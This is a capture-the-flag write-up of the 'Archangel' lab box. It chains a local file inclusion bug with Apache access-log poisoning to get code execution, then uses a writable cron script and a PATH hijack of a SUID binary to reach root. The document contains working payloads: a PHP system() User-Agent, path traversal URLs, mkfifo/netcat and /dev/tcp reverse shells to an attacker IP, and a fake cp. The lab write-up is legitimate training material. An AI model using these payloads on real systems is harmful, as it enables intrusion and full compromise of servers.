Archangel: LFI, log poisoning, and a PATH-hijacked SUID binary to root

The real target isn't the site nmap and gobuster find first, it's a second virtual host hinted at by a support email address. Behind it: a textbook local file inclusion bug, turned into code execution by poisoning Apache's own access log, a cron-executed script that pivots to a second user, and a SUID backup binary that trusts an unqualified command.

Room: Archangel Category: Web / LFI Tools: gobuster, Burp Suite, nc

The setup: one web app is served on the box's IP directly, but it's a decorative front, the real vulnerable application lives on a second hostname that's never advertised anywhere except a contact email address in the first site's footer. The job: find it, then chain an LFI into full code execution and root.

The Investigation

1
Scan, then find the real target hiding in plain sight
nmap -sV -sC 10.10.133.36
22/tcp open  ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp open  http   Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Wavefire

Gobuster against the site finds a few directories, none of them useful on their own:

gobuster dir -u http://10.10.133.36 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t16 -q
/images  (Status: 301)
/pages   (Status: 301)
/flags   (Status: 301)
/layout  (Status: 301)

The site itself ("WaveFire") is a generic template front, but its footer advertises a different company entirely, "Mafialive Solutions", with a contact address at support@mafialive.thm. That's a second hostname nowhere else mentioned.

Why this works

A contact email domain that doesn't match the site you're looking at is a strong signal there's a second, unlinked virtual host on the same server. Browser extensions like Wappalyzer are useful here too, confirming the stack (Apache, jQuery, Ubuntu) without extra requests.

2
Add the second host and find its hidden test page

Adding mafialive.thm to /etc/hosts pointed at the same IP brings up the real target. Its robots.txt gives away exactly what it's trying to hide:

User-agent: *
Disallow: /test.php

The page itself is blunt about what it is:

Test Page. Not to be Deployed
[Here is a button]
Control is an illusion

Its source reveals the link the button points to:

<a href="/test.php?view=/var/www/html/development_testing/mrrobot.php">
  <button id="secret">Here is a button</button>
</a>
Why this works

robots.txt disallowing a specific file is a direct pointer to it, and a view= parameter that takes a full filesystem path is about as explicit an LFI invitation as a web app can give.

3
Poison the Apache access log via the User-Agent header

LFI alone reads files, it doesn't execute code, unless the included file itself contains PHP. Apache's own access log is a file the server writes to on every request, including the User-Agent header verbatim. Sending a PHP payload as the User-Agent plants it directly in the log:

GET /test.php?view=/var/www/html/development_testing/mrrobot.php HTTP/1.1
Host: mafialive.thm
User-Agent: Mozilla/5.0 <?php system($_GET['cmd']); ?> (X11; Linux aarch64; rv:78.0) Gecko/20100101 Firefox/78.0
Why this works

Log poisoning turns "read any file" into "execute any code" the moment the file being read is one the attacker can also write to, and a web server access log is written to on every single request, headers included, with no sanitization expected since it's meant to be read by humans, not interpreted.

4
Include the poisoned log and confirm code execution

Pointing the view parameter at the access log instead of the original file, four directories up via path traversal to escape the restricted base path, executes whatever PHP is sitting in it:

http://mafialive.thm/test.php?view=/var/www/html/development_testing/../../../../log/apache2/access.log&cmd=id

The poisoned User-Agent line in the log runs, and its output appears inline on the page:

uid=33(www-data) gid=33(www-data) groups=33(www-data)
Why this works

Confirming the exact traversal depth (four ../ here) is what turns a theoretical LFI into a working one, the base include path isn't the filesystem root, so the traversal has to land precisely on the real log location.

5
Turn the primitive into a real reverse shell

Rather than keep passing one-off commands through &cmd=, the same RCE primitive can be driven straight from curl using a poisoned User-Agent that writes and runs a FIFO-based reverse shell:

curl http://mafialive.thm -A "<?php echo system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.57.21 4444 >/tmp/f') ?>"

With a listener waiting, that lands an interactive shell:

nc -lvnp 4444
connect to [10.2.57.21] from (UNKNOWN) [10.10.26.73] 39326
$ ls -la
drwxr-xr-x 4 root root 4096 Nov 17  2020 ..
-rw-r--r-- 1 1000 1000   59 Nov 19  2020 index.html
-rw-r--r-- 1 1000 1000   40 Oct 31  2020 mrrobot.php
-rw-r--r-- 1 root root   34 Nov 19  2020 robots.txt
-rw-r--r-- 1 1000 1000  712 Nov 19  2020 test.php
Why this works

This still rides the exact same log-poisoning primitive as the manual &cmd= request, it's just a more useful payload: a persistent interactive shell instead of one command's output at a time.

6
Pivot to a second user via a writable, cron-run script

As www-data, /opt/helloworld.sh is world-writable and owned by a different user, archangel:

echo "/bin/sh -i >& /dev/tcp/10.2.57.21/4445 0>&1" > /opt/helloworld.sh
ls -la /opt/helloworld.sh
-rwxrwxrwx 1 archangel archangel 44 Aug 17 11:59 /opt/helloworld.sh

Overwriting it with a reverse shell payload and waiting for whatever runs it (a cron job, most likely, given the name and permissions) pays off:

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.57.21 4445 >/tmp/f" > /opt/helloworld.sh

nc -lvnp 4445
connect to [10.2.57.21] from (UNKNOWN) [10.10.217.241] 60666
$ id
uid=1001(archangel) gid=1001(archangel) groups=1001(archangel)
Why this works

A world-writable script owned by another user, especially one that looks like it's meant to run unattended, is a direct privilege pivot: whatever process executes it runs with that owner's permissions, and the attacker controls the script's contents.

7
Find the SUID binary in archangel's own secret directory
cd ~/secret
ls -la
-rwsr-xr-x 1 root      root      16904 Nov 18  2020 backup
-rw-r--r-- 1 root      root         49 Nov 19  2020 user2.txt

strings on the binary shows exactly what it does when run:

strings backup
...
cp /home/user/archangel/myfiles/* /opt/backupfiles
Why this works

The binary calls cp with no absolute path, trusting whatever the shell's PATH resolves it to. Any SUID binary that shells out to an unqualified command name is a PATH hijack waiting to happen.

8
Hijack PATH and run the binary for root

Writing a fake cp that's really a shell, making it executable, and prepending the current directory to PATH means the next unqualified cp call resolves to it instead of the real one:

echo "/bin/bash" > cp
chmod +x cp
export PATH=$PWD:$PATH

Running the SUID binary now runs the fake cp, as root:

./backup
root@ubuntu:~/secret# whoami
root
Why this works

SUID means the binary executes with the file owner's privileges, root, regardless of who runs it. Since it never hardcodes cp's full path, whatever cp resolves to under the calling user's PATH is what actually runs, with root's permissions attached.

Full Attack Chain

Wavefire (decorative front site)
  → contact email reveals a second hostname: mafialive.thm
       → robots.txt: /test.php, an LFI-vulnerable view= parameter
            → User-Agent header poisons the Apache access log
                 → LFI includes the poisoned log: RCE as www-data
                      → reverse shell as www-data
                           → /opt/helloworld.sh: writable, cron-run as archangel
                                → reverse shell as archangel
                                     → ~/secret/backup: SUID, calls unqualified cp
                                          → PATH hijack → root

Takeaways

The real target isn't always the obvious one

The site on the box's bare IP was a decoy. The actual vulnerable application only surfaced through a contact email address pointing at a different domain entirely.

LFI plus a writable log is RCE

A file-read bug becomes code execution the moment the included file can also be influenced by the attacker, and a web server's own access log, written on every request, is one of the most reliable ways to do that.

World-writable scripts owned by another user are a privilege pivot

Whatever runs that script, a cron job in this case, runs it with the owner's permissions. Controlling the contents is controlling that execution.

Unqualified commands in SUID binaries are still a classic

strings on any SUID binary is worth running before assuming it needs a novel exploit. A bare command name with no path is often all it takes.
